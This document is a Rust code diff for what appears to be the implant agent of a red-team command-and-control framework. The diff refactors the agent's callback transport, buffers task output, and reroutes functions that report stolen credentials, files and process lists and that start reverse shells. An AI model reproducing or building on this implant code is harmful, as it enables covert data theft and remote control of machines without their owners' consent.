@@ -16,6 +16,7 @@ pub struct ImixAgent<T: Transport> {
     runtime_handle: tokio::runtime::Handle,
     pub task_registry: TaskRegistry,
     pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
+    pub output_buffer: Arc<Mutex<Vec<c2::ReportTaskOutputRequest>>>,
 }
 
 impl<T: Transport + 'static> ImixAgent<T> {
@@ -31,6 +32,7 @@ impl<T: Transport + 'static> ImixAgent<T> {
             runtime_handle,
             task_registry,
             subtasks: Arc::new(Mutex::new(BTreeMap::new())),
+            output_buffer: Arc::new(Mutex::new(Vec::new())),
         }
     }
 
@@ -41,6 +43,73 @@ impl<T: Transport + 'static> ImixAgent<T> {
         } else {
             5
         }
+    }
+
+    // Triggers config.refresh_primary_ip() in a write lock
+    pub async fn refresh_ip(&self) {
+        let mut cfg = self.config.write().await;
+        cfg.refresh_primary_ip();
+    }
+
+    // Updates the shared transport with a new instance
+    pub async fn update_transport(&self, t: T) {
+        let mut transport = self.transport.write().await;
+        *transport = t;
+    }
+
+    // Flushes all buffered task outputs using the provided transport (or internal one if not provided, but here we assume internal is set by main)
+    pub async fn flush_outputs(&self) {
+        // Drain the buffer
+        let mut buffer = match self.output_buffer.lock() {
+            Ok(b) => b,
+            Err(_) => return,
+        };
+        let outputs: Vec<_> = buffer.drain(..).collect();
+        drop(buffer); // Release lock
+
+        if outputs.is_empty() {
+            return;
+        }
+
+        #[cfg(debug_assertions)]
+        log::info!("Flushing {} task outputs", outputs.len());
+
+        let mut transport = self.transport.write().await;
+        for output in outputs {
+            if let Err(_e) = transport.report_task_output(output).await {
+                #[cfg(debug_assertions)]
+                log::error!("Failed to report task output: {_e}");
+            }
+        }
+    }
+
+    // Helper to get config URIs for creating new transport
+    pub async fn get_transport_config(&self) -> (String, Option<String>) {
+        let cfg = self.config.read().await;
+        (cfg.callback_uri.clone(), cfg.proxy_uri.clone())
+    }
+
+    // Helper to get a usable transport.
+    // If the shared transport is active, returns a clone of it.
+    // If not, creates a new one from config.
+    async fn get_usable_transport(&self) -> Result<T> {
+        // 1. Check shared transport
+        {
+            let guard = self.transport.read().await;
+            if guard.is_active() {
+                return Ok(guard.clone());
+            }
+        }
+
+        // 2. Create new transport from config
+        let (callback_uri, proxy_uri) = self.get_transport_config().await;
+        let t = T::new(callback_uri, proxy_uri)
+            .context("Failed to create on-demand transport")?;
+
+        #[cfg(debug_assertions)]
+        log::debug!("Created on-demand transport for background task");
+
+        Ok(t)
     }
 
     // Helper to fetch tasks and return them, so main can spawn
@@ -70,7 +139,8 @@ impl<T: Transport + 'static> ImixAgent<T> {
 impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
         self.block_on(async {
-            let mut t = self.transport.write().await;
+            let mut t = self.get_usable_transport().await.map_err(|e| e.to_string())?;
+
             // Transport uses std::sync::mpsc::Sender for fetch_asset
             let (tx, rx) = std::sync::mpsc::channel();
             t.fetch_asset(req, tx).await.map_err(|e| e.to_string())?;
@@ -88,14 +158,14 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         req: c2::ReportCredentialRequest,
     ) -> Result<c2::ReportCredentialResponse, String> {
         self.block_on(async {
-            let mut t = self.transport.write().await;
+            let mut t = self.get_usable_transport().await.map_err(|e| e.to_string())?;
             t.report_credential(req).await.map_err(|e| e.to_string())
         })
     }
 
     fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String> {
         self.block_on(async {
-            let mut t = self.transport.write().await;
+            let mut t = self.get_usable_transport().await.map_err(|e| e.to_string())?;
             // Transport uses std::sync::mpsc::Receiver for report_file
             let (tx, rx) = std::sync::mpsc::channel();
             tx.send(req).map_err(|e| e.to_string())?;
@@ -109,7 +179,7 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         req: c2::ReportProcessListRequest,
     ) -> Result<c2::ReportProcessListResponse, String> {
         self.block_on(async {
-            let mut t = self.transport.write().await;
+            let mut t = self.get_usable_transport().await.map_err(|e| e.to_string())?;
             t.report_process_list(req).await.map_err(|e| e.to_string())
         })
     }
@@ -118,10 +188,10 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         &self,
         req: c2::ReportTaskOutputRequest,
     ) -> Result<c2::ReportTaskOutputResponse, String> {
-        self.block_on(async {
-            let mut t = self.transport.write().await;
-            t.report_task_output(req).await.map_err(|e| e.to_string())
-        })
+        // Buffer output instead of sending immediately
+        let mut buffer = self.output_buffer.lock().map_err(|e| e.to_string())?;
+        buffer.push(req);
+        Ok(c2::ReportTaskOutputResponse {})
     }
 
     fn reverse_shell(&self) -> Result<(), String> {
@@ -131,11 +201,9 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
         let subtasks = self.subtasks.clone();
 
-        // We need to clone the transport to move it into the spawned task.
-        // Since we are in a synchronous context, we use block_on to acquire the async lock.
+        // Get usable transport (new or existing)
         let transport_clone = self.block_on(async {
-            let guard = self.transport.read().await;
-            Ok(guard.clone())
+            self.get_usable_transport().await.map_err(|e| e.to_string())
         })?;
 
         let handle = self.runtime_handle.spawn(async move {
@@ -156,9 +224,9 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
         let subtasks = self.subtasks.clone();
 
+        // Get usable transport (new or existing)
         let transport_clone = self.block_on(async {
-            let guard = self.transport.read().await;
-            Ok(guard.clone())
+            self.get_usable_transport().await.map_err(|e| e.to_string())
         })?;
 
         let handle = self.runtime_handle.spawn(async move {
@@ -176,8 +244,10 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     }
 
     fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
+        // Direct claim tasks logic usually used internally or for chaining.
+        // We use get_usable_transport here as well to be safe.
         self.block_on(async {
-            let mut t = self.transport.write().await;
+            let mut t = self.get_usable_transport().await.map_err(|e| e.to_string())?;
             t.claim_tasks(req).await.map_err(|e| e.to_string())
         })
     }
